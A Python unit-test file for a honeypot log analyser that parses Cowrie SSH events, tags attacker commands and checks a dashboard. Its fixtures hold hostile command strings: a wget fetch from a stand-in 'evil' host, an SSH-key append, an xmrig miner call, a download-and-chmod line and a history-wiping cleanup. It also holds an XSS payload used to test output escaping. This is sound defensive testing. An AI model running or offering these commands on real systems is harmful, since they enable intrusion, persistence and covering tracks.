import json
import os
import tempfile
import threading
import unittest
import urllib.request
from datetime import datetime

import utils.i18n as i18n
from detector.dashboard import create_server
from detector.honeypot import classify, load_cowrie, summarize_honeypot

i18n.set_lang("en")
XSS = "<script>alert(1)</script>"


def _events():
    now = datetime.utcnow().isoformat() + "Z"
    base = {"src_ip": "5.6.7.8", "timestamp": now}
    return [
        dict(base, eventid="cowrie.session.connect"),
        dict(base, eventid="cowrie.client.version", version="SSH-2.0-libssh"),
        dict(base, eventid="cowrie.login.failed", username="root", password="123456"),
        dict(base, eventid="cowrie.login.failed", username="admin", password="123456"),
        dict(base, eventid="cowrie.login.success", username="root", password=XSS),
        dict(base, eventid="cowrie.command.input", input="uname -a"),
        dict(base, eventid="cowrie.command.input", input="wget http://evil/x.sh"),
        dict(base, eventid="cowrie.session.file_download", url="http://evil/x.sh", shasum="a" * 64),
    ]


class TestHoneypot(unittest.TestCase):
    def setUp(self):
        fd, self.path = tempfile.mkstemp(suffix=".json")
        os.close(fd)
        self.addCleanup(os.remove, self.path)
        with open(self.path, "w", encoding="utf-8") as fh:
            for e in _events():
                fh.write(json.dumps(e) + "\n")
            fh.write("not json\n")

    def summary(self):
        return summarize_honeypot(load_cowrie([self.path]), None, datetime.utcnow())

    def test_totals_and_rankings(self):
        s = self.summary()
        self.assertEqual(s["totals"], {"sessions": 1, "attempts": 3, "unique_ips": 1,
                                       "shell_logins": 1, "commands": 2, "downloads": 1})
        self.assertEqual(s["passwords"][0], ["123456", 2])
        self.assertEqual(s["shell_ips"], ["5.6.7.8"])
        self.assertEqual(s["recent_commands"][0]["command"], "wget http://evil/x.sh")

    def test_classify(self):
        self.assertEqual(classify("uname -a"), ["recon"])
        self.assertIn("ssh_key", classify('echo "ssh-rsa AAAA" >> ~/.ssh/authorized_keys'))
        self.assertIn("miner", classify("./xmrig -o stratum+tcp://pool"))
        self.assertIn("download_exec", classify("wget http://x/y.sh; chmod +x y.sh"))
        self.assertIn("cleanup", classify("rm -rf /tmp/y.sh; history -c"))
        self.assertEqual(classify("echo hello"), [])

    def test_behaviours_and_hashes(self):
        s = self.summary()
        self.assertIn(["recon", 1], s["behaviours"])
        self.assertIn(["download_exec", 1], s["behaviours"])
        self.assertEqual(s["hashes"], [["a" * 64, 1]])
        self.assertEqual(s["recent_commands"][0]["tags"], ["download_exec"])

    def test_missing_file_is_ignored(self):
        self.assertEqual(load_cowrie(["/nonexistent/cowrie.json"]), [])

    def test_long_text_is_clipped(self):
        rec = _events()[2]
        rec["password"] = "a" * 500
        with open(self.path, "w", encoding="utf-8") as fh:
            fh.write(json.dumps(rec) + "\n")
        self.assertLessEqual(len(self.summary()["passwords"][0][0]), 120)

    def test_dashboard_panel_escapes_and_api(self):
        fd, alerts = tempfile.mkstemp(suffix=".jsonl")
        os.close(fd)
        self.addCleanup(os.remove, alerts)
        server = create_server(alerts, "127.0.0.1", 0, honeypot_paths=[self.path])
        t = threading.Thread(target=server.serve_forever, daemon=True)
        t.start()
        self.addCleanup(t.join, 5)
        self.addCleanup(server.server_close)
        self.addCleanup(server.shutdown)
        base = f"http://127.0.0.1:{server.server_address[1]}"
        with urllib.request.urlopen(base + "/", timeout=5) as r:
            body = r.read().decode()
        self.assertIn("Honeypot (Cowrie)", body)
        self.assertNotIn(XSS, body)
        self.assertIn("&lt;script&gt;", body)
        with urllib.request.urlopen(base + "/api/summary?since=all", timeout=5) as r:
            self.assertEqual(json.loads(r.read())["honeypot"]["totals"]["attempts"], 3)


if __name__ == "__main__":
    unittest.main()
